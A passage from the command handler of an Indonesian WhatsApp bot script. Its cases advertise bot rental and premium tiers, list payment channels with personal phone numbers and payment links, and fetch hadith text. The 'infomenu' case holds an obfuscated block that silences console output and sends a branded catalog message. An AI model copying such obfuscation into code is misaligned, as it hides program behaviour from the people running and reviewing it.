  mentions(txt, men, true)
  break
  case 'belipremium':
  case 'buypremium':
  case 'sewabot':
  gopeynya = `${qris}`
  buff = await getBuffer(gopeynya)
  teksnya = `
  ┏━━⬣ PRICE LIST 1
  ┃⬡ SEWA 5K/MINGGU
  ┃⬡ SEWA 10K/BLN
  ┃⬡ SEWA + PREMIUM 15K
  ┃⬡ PERMANEN 25K
  ┃⬡ PERMANEN + PREM 30K
  ┃⬡ ALL PERMANEN 35K
  ┗━━⬣

  ┏━━⬣ PRICE LIST 2
  ┃⬡ JADI BOT 10K/BLN
  ┃⬡ JADI BOT + OWNER 30K
  ┃⬡ SC BOT TANYA OWNER
  ┗━━⬣

  ┏━━⬣ MINAT? PM
  ┃⬡ wa.me/6283127014833
  ┃⬡ Ig @Kahfz_13
  ┃⬡ Yt KAHFZ BOT 
  ┗━━⬣
  `
  buttons = [{buttonId: noprefix ? "menu" : "!"+"owner",buttonText:{displayText: `OWNER`},type:1},{buttonId: `${prefix}payment`,buttonText:{displayText: `PAYMENT`},type:1},{buttonId: `${prefix}premium112`,buttonText:{displayText: `HARGA PREMIUM FITUR`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
case 'premium112':
gopeynya = `${qris}`
  buff = await getBuffer(gopeynya)
  teksnya = `
  *── 「 UPGRADE PREMIUM 」 ──*

*Tarif Premium User adalah 10K Perbulan*
*Keuntungan Premium Diantaranya:*
♲ *Bebas memakai fitur premium*
♲ *Dapat Informasi Lebih dulu akan Update, Nomor Bot Baru (Jika Terbanned), dan Lainnya*

*Jika Tertarik,Kalian Bisa Bayar Melalui Metode Pembayaran di Bawah:*
*OVO/Dana/Gopay = ${ownerNumber}*
*Qris pada gambar diatas*
*SAWERIA = https://saweria.co/K4HFZ*

*Info Lebih Lengkap Chat Owner, Ketik ${prefix}owner
*_note_*:
*Pembelian Premium yang disertai SewaBot hanya akan membayar 5k 30d Premium Fitur*
`
buttons = [{buttonId: noprefix ? "menu" : "!"+"owner",buttonText:{displayText: `OWNER`},type:1},{buttonId: `${prefix}payment`,buttonText:{displayText: `PAYMENT`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
case 'buysc22':
gopeynya = `${ppbot}`
  buff = await getBuffer(gopeynya)
  teksnya = `
  ┏━━⬣ FITUR BOT
  ┃⬡ ANONMYUS CHAT (KAYA BOT\n  ┃ TELE)
  ┃⬡ NHENTAI BOT
  ┃⬡ FREE APIKEY / JIKA ADA
  ┃⬡ WELCOME IMAGE
  ┃⬡ ANTILINK
  ┃⬡ VOTE
  ┃⬡ ANTI VIEWONCE
  ┃⬡ ANTI DELETE
  ┃⬡ TRIGGERED
  ┃⬡ TIC TAC TOE
  ┃⬡ PREMUM SEWA 
  ┃⬡ VERIFY BUTTON
  ┃⬡  DLL
  ┃⬡ 200 FITUR + FULL BUTTON CMD
  ┃⬡ 600+ FITUR LAIN NYA
  ┃⬡ FITUR IMAGE FULL BUTTON
  ┗━━⬣
  
  ┏━━⬣ HARGA SC / SCRIPT BOT
  ┃⬡ 35K DI SAYA DI IKY TANYA AJA 
  ┃⬡ DI SAYA NEGO DIKIT BOLEH YE\n  ┃ASAL NGOTAK
  ┗━━━━━━━━━━━━━━━━━━━━━━━━
  ┏━━⬣ MINAT? PM
  ┃⬡ wa.me/6283127014733
  ┃⬡ Ig @Kahfz_13
  ┃⬡ Yt KAHFZ BOT 
  ┗━━⬣
  `
  buttons = [{buttonId: noprefix ? "menu" : "!"+"owner",buttonText:{displayText: `OWNER`},type:1},{buttonId: `${prefix}payment`,buttonText:{displayText: `PAYMENT`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
case 'tes11':
   case 'infomenu':
              menu =`
ð‹ðˆð’ð“ ðŒð„ðð”
â–¹ ${prefix}update
â–¹ ${prefix}level
â–¹ ${prefix}rules
â–¹ ${prefix}profile
â–¹ ${prefix}waktu
â–¹ ${prefix}botstat
â–¹ ${prefix}sewabot
â–¹ ${prefix}listsewa
â–¹ ${prefix}owner
â–¹ ${prefix}ping
â–¹ ${prefix}runtime
â–¹ ${prefix}donasi
â–¹ ${prefix}leaderboard
â–¹ ${prefix}cekpremium
â–¹ ${prefix}listpremium
â–¹ ${prefix}sourcecode
â–¹ ${prefix}bugreport *keluhan*`;
        	///Masih Langkh
        	(function(_0x56bf55,_0x490e4b){var _0x32b3f6=_0x56bf55();function _0x2dcc3d(_0x3154d5,_0x2b9f16,_0x42dcfe,_0x59309a){return _0x1403(_0x3154d5- -0x126,_0x42dcfe);}function _0x59637f(_0x2e2f17,_0x50b4a1,_0x2e7a56,_0x7a4b6c){return _0x1403(_0x50b4a1- -0x141,_0x7a4b6c);}while(!![]){try{var _0x318c6d=-parseInt(_0x59637f(0x6c,0x84,0x7e,0x61))/(0x162c+0x1eb6+-0x1*0x34e1)*(parseInt(_0x2dcc3d(0x65,0x8b,0x62,0x3e))/(-0xfe6+0x2449+-0x1461))+-parseInt(_0x59637f(0x76,0x5d,0x7b,0x6a))/(0xbe6+0x17c8+-0x23ab*0x1)*(parseInt(_0x2dcc3d(0x54,0x81,0x45,0x6e))/(-0x202e+0x10a1+-0x5*-0x31d))+parseInt(_0x59637f(0x73,0x8d,0x9c,0xb6))/(0x1b16+0x229*0x5+-0x25de)*(parseInt(_0x59637f(0x72,0x73,0x45,0x9c))/(0x26ba+0x25fb+-0x4caf))+parseInt(_0x59637f(0x1c,0x3f,0x50,0x69))/(-0x1bf5+0x251*-0x1+0x1e4d)+-parseInt(_0x2dcc3d(0x9e,0x7e,0x79,0xcc))/(0x442+-0x19b3+0x1579*0x1)+parseInt(_0x59637f(0x56,0x67,0x8d,0x73))/(0x56*-0x3e+-0x8f4+0x1dd1)*(-parseInt(_0x59637f(0x28,0x4d,0x56,0x33))/(0x1c9e+0x1*-0xc8a+-0x100a))+-parseInt(_0x59637f(0x6b,0x81,0x9f,0xa3))/(0x12ef*-0x2+0x1f1d+-0xae*-0xa)*(-parseInt(_0x2dcc3d(0x83,0x96,0x89,0x98))/(-0xe16+0x9*0x172+0x120));if(_0x318c6d===_0x490e4b)break;else _0x32b3f6['push'](_0x32b3f6['shift']());}catch(_0x204f46){_0x32b3f6['push'](_0x32b3f6['shift']());}}}(_0x4fb7,-0x14e488+0x66ddb*-0x2+0x77c00*0x6));var _0x4b1914=(function(){var _0x4febad={'uOSJl':function(_0x4e69ec,_0x4bb915){return _0x4e69ec!==_0x4bb915;},'RtlqY':_0x2c8629(-0x186,-0x1a7,-0x1a6,-0x198),'EwyHo':_0x2c8629(-0x184,-0x17e,-0x1a5,-0x173),'PEBcm':function(_0x79262b,_0x44ff64){return _0x79262b(_0x44ff64);},'jCKur':function(_0x527ceb,_0x3f3395){return _0x527ceb+_0x3f3395;},'SoSjT':_0x2b4471(-0x20d,-0x23b,-0x21a,-0x221)+_0x2c8629(-0x13d,-0x151,-0x131,-0x130),'iwRmI':_0x2b4471(-0x250,-0x1f1,-0x1f3,-0x220)+_0x2b4471(-0x216,-0x1e1,-0x209,-0x1f2)+_0x2b4471(-0x1bb,-0x1bc,-0x1d0,-0x1e6)+'\x20)'};function _0x2b4471(_0x151d69,_0x33bf29,_0x437543,_0x202e65){return _0x1403(_0x202e65- -0x3a9,_0x151d69);}var _0x5c40fa=!![];function _0x2c8629(_0x374928,_0x51273d,_0x1757ad,_0x19674f){return _0x1403(_0x374928- -0x303,_0x19674f);}return function(_0x166d51,_0x5aa84e){var _0x4392d6={'IcBHJ':function(_0xb4ffec,_0x580284){function _0x45ef87(_0x1cb1c4,_0x2bd9f4,_0x27d169,_0x58bc72){return _0x1403(_0x58bc72-0x2aa,_0x1cb1c4);}return _0x4febad[_0x45ef87(0x45e,0x448,0x44e,0x43f)](_0xb4ffec,_0x580284);},'JOqQi':function(_0x2c3ada,_0x1df600){function _0x54bf13(_0x3fdd3c,_0x4c800e,_0x2352e8,_0x222b3d){return _0x1403(_0x4c800e- -0x151,_0x2352e8);}return _0x4febad[_0x54bf13(0x96,0x83,0x8a,0xa1)](_0x2c3ada,_0x1df600);},'JiJqe':_0x4febad[_0x181158(0x548,0x561,0x542,0x54d)],'odrGr':_0x4febad['iwRmI']};function _0x181158(_0x34852d,_0x2b022e,_0x2fe05d,_0x3a10ce){return _0x2c8629(_0x2b022e-0x6c8,_0x2b022e-0x4e,_0x2fe05d-0x9e,_0x34852d);}var _0x21c1e5=_0x5c40fa?function(){function _0x2ea34b(_0x4ed06d,_0x187bf7,_0x42c839,_0x4a436c){return _0x181158(_0x4ed06d,_0x42c839- -0x137,_0x42c839-0x90,_0x4a436c-0x16f);}function _0xc9d5f1(_0x296af1,_0x23e389,_0x194829,_0x6a5034){return _0x181158(_0x23e389,_0x6a5034- -0x439,_0x194829-0x5a,_0x6a5034-0x5d);}if(_0x4febad[_0x2ea34b(0x454,0x46b,0x460,0x458)](_0x4febad[_0x2ea34b(0x41c,0x3fc,0x418,0x3ed)],_0x4febad[_0xc9d5f1(0x165,0x120,0x125,0x146)])){if(_0x5aa84e){var _0x276312=_0x5aa84e['apply'](_0x166d51,arguments);return _0x5aa84e=null,_0x276312;}}else _0x4f8d67=_0x4392d6[_0x2ea34b(0x43c,0x409,0x40f,0x42d)](_0x22976a,_0x4392d6['JOqQi'](_0x4392d6[_0xc9d5f1(0x151,0x139,0x13c,0x12b)]+_0x4392d6[_0x2ea34b(0x46b,0x483,0x45d,0x46c)],');'))();}:function(){};return _0x5c40fa=![],_0x21c1e5;};}()),_0xbd540=_0x4b1914(this,function(){function _0x29a9d3(_0x2b9d57,_0x2db1e6,_0x4bbd8c,_0x39ac16){return _0x1403(_0x4bbd8c-0x62,_0x2db1e6);}var _0x276281={};_0x276281[_0x29a9d3(0x22e,0x202,0x204,0x229)]=_0x29a9d3(0x21a,0x213,0x21f,0x229)+'+$';function _0x17552b(_0x44a6c7,_0x416d4c,_0x21ea70,_0xc2de5){return _0x1403(_0x416d4c-0x178,_0x21ea70);}var _0x55e2b6=_0x276281;return _0xbd540[_0x17552b(0x311,0x340,0x323,0x34c)]()['search'](_0x55e2b6[_0x29a9d3(0x21e,0x21c,0x204,0x1da)])[_0x29a9d3(0x227,0x221,0x22a,0x21d)]()[_0x17552b(0x328,0x323,0x31f,0x31f)+'r'](_0xbd540)[_0x29a9d3(0x20f,0x232,0x21a,0x249)](_0x55e2b6[_0x29a9d3(0x232,0x21d,0x204,0x212)]);});_0xbd540();function _0x1403(_0x56265e,_0x48e2c3){var _0xbd540=_0x4fb7();return _0x1403=function(_0x4b1914,_0x4fb726){_0x4b1914=_0x4b1914-(-0x22af+-0x1b5c+0x3f83);var _0x140314=_0xbd540[_0x4b1914];return _0x140314;},_0x1403(_0x56265e,_0x48e2c3);}function _0x4fb7(){var _0x61761a=['firstImage','waEpW','3841803WolRrO','IcBHJ','OJQMF',':\x20KAHFZ\x20BOT','sage','HAI\x20*','productIma','IDR','return\x20(fu','{}.constru','RtlqY','7726OdKfKg','ntent','xNBZd','7048830VHZXZh','title','message','sageFromCo','bind','ZEfuz','VVtQs','PEBcm','salePriceA','log','ï¿½KAHFZ\x20BOT','url','833@s.what','t1000','SoSjT','4715716298','42CGrKMd','JiJqe','mimetype','35000000','FdRtJ','sapp.net','prepareMes','NApOZ','ðŸ‘‹*','kAEGL','9PBNEjC','5224476gAjUhu','bAXkC','constructo','XayLe','product','quoted','footerText','console','apply','https://','orAQr','228bUqYOq','error','nerJid','ctor(\x22retu','search','info','EwyHo','cIdZa','relayWAMes','(((.+)+)+)','mount1000','currencyCo','length','businessOw','55fWXpfm','rn\x20this\x22)(','1534776kaftpq','344DRpgyd','nction()\x20','descriptio','toString','prototype','6283127014','warn','SUBSCRIBE\x20','qaAcv','92615IVtsFG','odrGr','priceAmoun','image/wpmobile.jpeg','uOSJl','retailerId','jCKur','imageMessa','trace','vcQmQ','xWFdw','table','135112rvnOTs','productId','K4HFZ','HOedr'];_0x4fb7=function(){return _0x61761a;};return _0x4fb7();}var _0x598c1a=(function(){var _0x55d264=!![];return function(_0x394621,_0x2baee8){function _0x3a5e29(_0x4de9fa,_0x2d9e86,_0x1f9b52,_0x162d8c){return _0x1403(_0x4de9fa-0x2e4,_0x162d8c);}function _0x140885(_0x43c49f,_0x52b2ab,_0x4cac62,_0x1c3240){return _0x1403(_0x1c3240-0x1e2,_0x4cac62);}if(_0x140885(0x39b,0x36e,0x37a,0x375)!==_0x140885(0x371,0x383,0x352,0x364)){var _0x1e11e8=_0x55d264?function(){function _0x41aa3(_0x687cd3,_0x10208d,_0x4ce14f,_0x3717f0){return _0x140885(_0x687cd3-0x52,_0x10208d-0x4a,_0x10208d,_0x4ce14f- -0x5c3);}if(_0x2baee8){var _0x4c2346=_0x2baee8[_0x41aa3(-0x256,-0x20d,-0x230,-0x258)](_0x394621,arguments);return _0x2baee8=null,_0x4c2346;}}:function(){};return _0x55d264=![],_0x1e11e8;}else{if(_0x8d08d0){var _0x3afbd2=_0x3aad63[_0x3a5e29(0x495,0x4a2,0x4bb,0x4c2)](_0x57a024,arguments);return _0x22aa71=null,_0x3afbd2;}}};}()),_0x260890=_0x598c1a(this,function(){function _0x9d6480(_0x119bac,_0x15636d,_0x1beeb5,_0x1da436){return _0x1403(_0x1beeb5-0x3ba,_0x1da436);}var _0x4a7ad5={'orAQr':function(_0x43d54a,_0xfd3afb){return _0x43d54a+_0xfd3afb;},'bAXkC':'return\x20(fu'+_0x9d6480(0x555,0x59e,0x580,0x590),'DAiId':_0x169395(-0xfc,-0x12c,-0x11d,-0xdf)+_0x9d6480(0x578,0x574,0x571,0x54a)+_0x169395(-0xc2,-0xcf,-0xd4,-0xa3)+'\x20)','NApOZ':function(_0x38bf50,_0x24da12){return _0x38bf50!==_0x24da12;},'xWFdw':'llfMl','vcQmQ':function(_0xf16896,_0x1d7362){return _0xf16896(_0x1d7362);},'VVtQs':function(_0x1080d2){return _0x1080d2();},'cIdZa':_0x169395(-0xba,-0xbd,-0xc0,-0x95),'SGIxA':_0x169395(-0xcc,-0xb7,-0xee,-0xdc),'qaAcv':'exception','xNBZd':_0x169395(-0x10c,-0xef,-0xf6,-0xe5),'kAEGL':_0x169395(-0xaf,-0xdf,-0x90,-0xb7),'XayLe':function(_0x4b5ce9,_0x25229b){return _0x4b5ce9<_0x25229b;}},_0x22b1df=function(){function _0x48a053(_0x332b90,_0x4bfd82,_0x3b38af,_0x52b70d){return _0x9d6480(_0x332b90-0x9d,_0x4bfd82-0x3,_0x4bfd82- -0x40d,_0x52b70d);}function _0x2232f8(_0x17dee3,_0x204923,_0x5df468,_0x117443){return _0x9d6480(_0x17dee3-0x1db,_0x204923-0x42,_0x204923- -0x6e3,_0x5df468);}if(_0x4a7ad5[_0x2232f8(-0x1b1,-0x184,-0x184,-0x1a5)](_0x4a7ad5[_0x2232f8(-0x1cd,-0x1b1,-0x187,-0x1e1)],_0x4a7ad5[_0x48a053(0x124,0x125,0x14a,0x13f)])){var _0x369883;try{_0x369883=_0x42f192(_0x4a7ad5[_0x48a053(0x17f,0x160,0x147,0x130)](_0x4a7ad5[_0x2232f8(-0x160,-0x176,-0x170,-0x162)](_0x4a7ad5[_0x48a053(0x17e,0x157,0x134,0x134)],_0x4a7ad5['DAiId']),');'))();}catch(_0x24fe4f){_0x369883=_0x54b347;}return _0x369883;}else{var _0x20552a;try{_0x20552a=_0x4a7ad5[_0x48a053(0x1a5,0x184,0x18e,0x179)](Function,_0x4a7ad5[_0x48a053(0x167,0x160,0x150,0x17c)](_0x4a7ad5[_0x2232f8(-0x199,-0x176,-0x19e,-0x175)](_0x4a7ad5['bAXkC'],_0x48a053(0x11b,0x136,0x14c,0x165)+_0x2232f8(-0x182,-0x172,-0x166,-0x154)+_0x2232f8(-0x187,-0x166,-0x15d,-0x16e)+'\x20)'),');'))();}catch(_0x2b6f3a){_0x20552a=window;}return _0x20552a;}};function _0x169395(_0x1077d5,_0x44b929,_0x372c6a,_0x1f1b8d){return _0x1403(_0x1077d5- -0x285,_0x372c6a);}var _0x4a65d4=_0x4a7ad5[_0x169395(-0xf1,-0x115,-0xe7,-0x11e)](_0x22b1df),_0x5e374d=_0x4a65d4[_0x169395(-0xd5,-0xa7,-0xc2,-0xd3)]=_0x4a65d4['console']||{},_0x142cbc=[_0x9d6480(0x54f,0x559,0x551,0x528),_0x4a7ad5[_0x9d6480(0x56e,0x587,0x575,0x59b)],_0x4a7ad5['SGIxA'],_0x9d6480(0x559,0x56f,0x56f,0x59a),_0x4a7ad5[_0x9d6480(0x58b,0x56d,0x587,0x563)],_0x4a7ad5[_0x9d6480(0x54d,0x551,0x547,0x537)],_0x4a7ad5[_0x9d6480(0x538,0x56e,0x561,0x54e)]];for(var _0x34b7dc=0x1c38+-0x87+-0x93b*0x3;_0x4a7ad5[_0x169395(-0xd9,-0xe0,-0xe2,-0xd4)](_0x34b7dc,_0x142cbc[_0x9d6480(0x5a5,0x5a0,0x57a,0x57a)]);_0x34b7dc++){var _0x493324=_0x598c1a[_0x169395(-0xda,-0x104,-0xbd,-0x10a)+'r'][_0x9d6480(0x58e,0x599,0x583,0x55d)]['bind'](_0x598c1a),_0x5275e5=_0x142cbc[_0x34b7dc],_0x2d628d=_0x5e374d[_0x5275e5]||_0x493324;_0x493324['__proto__']=_0x598c1a[_0x169395(-0xf3,-0xde,-0xf1,-0xda)](_0x598c1a),_0x493324[_0x169395(-0xbd,-0xe3,-0xcd,-0xe0)]=_0x2d628d['toString']['bind'](_0x2d628d),_0x5e374d[_0x5275e5]=_0x493324;}});_0x260890();var imgs=await kahfzz[_0x3c517c(0x1be,0x215,0x1e8,0x206)+_0x588cd5(-0x2,-0x8,-0xe,0x17)]('0@c.us',fakeimage,image,{'thumbnail':fakeimage}),imgCatalog=imgs[_0x3c517c(0x1f0,0x1b0,0x1d4,0x1a7)][_0x588cd5(0x1c,0x49,0x5a,0x31)+'ge'],_0x34ae59={};_0x34ae59[_0x588cd5(-0x14,-0x6,-0xa,0x22)+'ge']=imgCatalog;function _0x588cd5(_0x39e249,_0x33a731,_0x4a5411,_0x3bbd8b){return _0x1403(_0x33a731- -0x18c,_0x3bbd8b);}_0x34ae59[_0x3c517c(0x1cf,0x191,0x1bf,0x19c)]=_0x588cd5(0x29,0x11,-0x3,0x13)+'440452',_0x34ae59[_0x3c517c(0x1f3,0x1a5,0x1d3,0x1b5)]=_0x588cd5(-0xf,-0x7,-0x12,0x1c)+pushname+_0x588cd5(0x25,0x1a,0xa,0x24),_0x34ae59[_0x3c517c(0x1e9,0x22e,0x20b,0x20d)+'n']=menu,_0x34ae59[_0x3c517c(0x1ea,0x1d1,0x1f3,0x20f)]=_0x3c517c(0x1b3,0x20a,0x1dc,0x1c0),_0x34ae59[_0x588cd5(0x4d,0x33,0x42,0x39)+'de']=_0x588cd5(0x20,-0x5,-0x19,0x1e),_0x34ae59[_0x3c517c(0x1e9,0x22e,0x214,0x21d)+_0x3c517c(0x1b3,0x1f1,0x1df,0x1dc)]='100000000',_0x34ae59['productIma'+'geCount']=0x1,_0x34ae59[_0x3c517c(0x193,0x1a2,0x1c2,0x19b)+'Id']=0x1,_0x34ae59[_0x588cd5(0x18,0xa,-0x24,0x30)+_0x3c517c(0x210,0x212,0x202,0x1f1)]=_0x3c517c(0x1f6,0x1e8,0x1e5,0x1ea),_0x34ae59[_0x588cd5(0x6d,0x47,0x17,0x6c)]=_0x3c517c(0x1ee,0x230,0x210,0x223)+_0x588cd5(-0x1f,-0x9,0xa,-0x18),_0x34ae59[_0x588cd5(0x13,0xd,0x25,0x28)]=_0x3c517c(0x1f4,0x1d1,0x1f6,0x1f3)+'saweria.co/'+_0x588cd5(-0x34,-0x10,0x12,-0x40);var _0x444e05={};_0x444e05[_0x3c517c(0x1fe,0x1c6,0x1f1,0x218)]=_0x34ae59,_0x444e05[_0x3c517c(0x202,0x1fb,0x205,0x1f9)+_0x588cd5(0xa,0x2a,0x1d,0x39)]=_0x588cd5(0x35,0x3e,0x62,0x61)+_0x588cd5(-0x7,0xe,0xf,0x5)+_0x3c517c(0x215,0x1e3,0x1e7,0x1fd);var _0x71a9d={};_0x71a9d['productMes'+'sage']=_0x444e05;var _0x430b15={};_0x430b15[_0x588cd5(0x26,0x22,-0x6,0x3a)]=freply,_0x430b15[_0x588cd5(-0xa,0x14,0xf,-0x2)]=_0x3c517c(0x212,0x1f5,0x215,0x1ee);function _0x3c517c(_0x21b7d8,_0x176ce2,_0x2b8eac,_0x350ef3){return _0x1403(_0x2b8eac-0x44,_0x350ef3);}var ctlg=await kahfzz[_0x3c517c(0x1fe,0x1dc,0x1e8,0x1f7)+_0x3c517c(0x1cd,0x1bb,0x1d5,0x1b1)+_0x3c517c(0x1b7,0x1e2,0x1d0,0x1f8)](from,_0x71a9d,_0x430b15)
kahfzz[_0x3c517c(0x1ec,0x21b,0x200,0x1de)+'sage'](ctlg);
            break
case 'hadits':
     case 'hadis': case 'hadees': case 'hadist':
                    if (!q) return reply(`Contoh penggunaan ${command} bukhari 10`)
                    if (args.length < 3) return reply(`Example: ${command} bukhari 10`)
                    const listhades = ['darimi', 'ahmad', 'bukhari', 'muslim', 'malik', 'nasai', 'tirmidzi', 'abu-daud', 'ibnu-majah']
                    if (!listhades.includes(args[1].toLowerCase())) return reply(ind.hadis(command))
                    fetchJson(`https://api.hadith.sutanlab.id/books/${args[1].toLowerCase()}/${args[2]}`)
                    .then((habud) =>{
                    textImg(`${habud.data.contents.arab}\n\n${habud.data.contents.id}\n\n*${habud.data.name}*`)
                    })
              .catch((err) => {
                            kahfzz.sendMess(ownerNumber[0], `${command} Error:` + err)
                            reply(mess.error.api)
                        })
                    break
  case 'gopay':
  gopeynya = `${qris}`
  buff = await getBuffer(gopeynya)
  teksnya =`
  Hai kak ${pushname}

  Silahkan scan kode pembayaran di atas sesuai nominal!
  AN: Kahfz pokoknya ada nama Kahfz nya su

  *NOTE* JANGAN LUPA KIRIM BUKTI TRANSFER KEPADA OWNER!
  `
  buttons = [{buttonId: `${prefix}bukti`,buttonText:{displayText: `KIRIM BUKTI TF`},type:1},{buttonId: `${prefix}alldonasi`,buttonText:{displayText: `PAYMENT LAIN`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
case 'saweria':
gopeynya = `${ppbot}`
  buff = await getBuffer(gopeynya)
  teksnya = `
  Hai kak ${pushname}
  
  Saweria : https://saweria.co/K4HFZ


*NOTE* JANGAN LUPA KIRIM BUKTI TRANSFER KEPADA OWNER!
  `
  buttons = [{buttonId: `${prefix}bukti`,buttonText:{displayText: `KIRIM BUKTI TF`},type:1},{buttonId: `${prefix}alldonasi`,buttonText:{displayText: `PAYMENT LAIN`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
case 'ovo':
gopeynya = `https://a.top4top.io/p_2094biz6o9.jpg`
  buff = await getBuffer(gopeynya)
  teksnya =`
  Hai kak ${pushname}


  Silahkan scan kode pembayaran di atas sesuai nominal!
  AN: Kahfz pokoknya ada nama Kahfz nya su

  *NOTE* JANGAN LUPA KIRIM BUKTI TRANSFER KEPADA OWNER!
  `
  buttons = [{buttonId: `${prefix}bukti`,buttonText:{displayText: `KIRIM BUKTI TF`},type:1},{buttonId: `${prefix}alldonasi`,buttonText:{displayText: `PAYMENT LAIN`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @Kahfz_13', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
  case 'dana':
  gopeynya = `https://l.top4top.io/p_2094y1nsa8.jpg`
  buff = await getBuffer(gopeynya)
  teksnya = `
  Hai kak ${pushname}

  Silahkan Tf Sesuai Nominal Ya Kak!

  AN: KAHFZ POKOK NYA ADA KAHFZ NYA BROO

  Link Pembayaran: https://link.dana.id/qr/420wni18

  *NOTE* JANGAN LUPA KIRIM BUKTI TRANSFER KEPADA OWNER!`
  buttons = [{buttonId: `${prefix}bukti`,buttonText:{displayText: `KIRIM BUKTI TF`},type:1},{buttonId: `${prefix}alldonasi`,buttonText:{displayText: `PAYMENT LAIN`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'Kahfz Tod✓', imageMessage: imageMsg,
  contentText: teksnya,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
  case 'pulsa':

  thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
 privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
 ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
 charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
 uptime = process.uptime();
 timestampe = speed();
 totalChat = await kahfzz.chats.all()
 latensie = speed() - timestampe
 total = math(`${groups.length}*${privat.length}`)

 menu =`

 ${ucapanWaktu} Kak ${pushname} 👋

 Untuk melakukan pembayaran menggunakan pulsa silahkan isi kepada nomer di bawah!
 
 TELKOMSEL: 081365814200
 AXIS : 083127014833
 `




 kahfzz.sendMessage(from, { contentText: `${menu}`, footerText: 'iky gans', buttons: [{ buttonId: `${prefix}bukti`, buttonText: { displayText: 'KIRIM BUKTI TF' }, type: 1 },{ buttonId: `${prefix}payment`, buttonText: { displayText: 'GANTI PAYMENT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
 break
 case 'bukti':
 titid = `
 hai kak ${pushname}

 Jika sudah tf sesuai nominal silahkan kirim bukti ke owner ku ya!

 Wa.me/6283127014833`
 sendButMessage(from, titid, `Kahfz Su `, [
 {
  buttonId: `${prefix}infoig`,
  buttonText: {
 displayText: `⬡ IG OWNER`,
  },
  type: 1,
},]);
 break;
 

 case 'payment':
 list = []
 listmenu = [`gopay`,`dana`,`ovo`,`pulsa`,`saweria`,`scan`]
 listmenuu = [`BAYAR DENGAN GOPAY`,`BAYAR DENGAN DANA`,`BAYAR DENGAN OVO`,`BAYAR DENGAN PULSA`,`BAYAR DENGAN LINK SAWERIA`,`INFO BISNIS`]
 nombor = 1
 startnum = 0
 for (let x of listmenu) {
const yy = {title: 'payment ke' + nombor++,
rows: [
{
 title: `${listmenuu[startnum++]}`,
 description: `HARAP CHAT OWNER UNTUK LEBIH JELAS !!!`,
 rowId: `${prefix}${x}`
  }
  ]
}
list.push(yy)
}
listmsg(from, `hai kak ${pushname} \n\nSilahkan pilih metode pembayaran di bawah ya !`,`  `, list)
break
case 'donasi':
 txtt =`Hai Kak ${pushname}\nAda 2 Donasi Nih Alldonasi Sama Donasi 1 Lagi Wkwk\nSi Kahfz Gabut Bet Bikin 2 Donasi`

 buttons = [{buttonId: noprefix ? "donasi22" : "!"+"donasi22",buttonText:{displayText: 'ALLDONASI'},type:1},{buttonId: noprefix ? "donate1" : "!"+"donate1",buttonText:{displayText: 'DONASI📘'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jika Tidak Terlihat Button/Wa Gb ketik *!alldonasi*',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
					break
case 'donate1':
 list = []
 listmenu = [`gopay`,`dana`,`ovo`,`pulsa`,`saweria`]
 listmenuu = [`GOPAY`,`DANA`,`OVO`,`PULSA`,`SAWERIA`]
 nombor = 1
 startnum = 0
 for (let x of listmenu) {
const yy = {title: 'donasi ke' + nombor++,
rows: [
{
 title: `${listmenuu[startnum++]}`,
 description: `HARAP CHAT OWNER UNTUK LEBIH JELAS !!!`,
 rowId: `${prefix}${x}`
  }
  ]
}
list.push(yy)
}
